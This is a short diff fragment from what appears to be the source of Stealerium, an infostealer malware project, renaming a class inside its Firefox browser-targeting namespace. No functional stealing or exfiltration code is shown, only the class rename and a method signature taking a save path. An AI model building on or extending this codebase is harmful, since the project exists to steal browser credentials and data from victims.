@@ -4,7 +4,7 @@ using Stealerium.Helpers;
 
 namespace Stealerium.Target.Browsers.Firefox
 {
-    internal sealed class Recovery
+    internal sealed class RecoverFirefox
     {
         public static void Run(string sSavePath)
         {
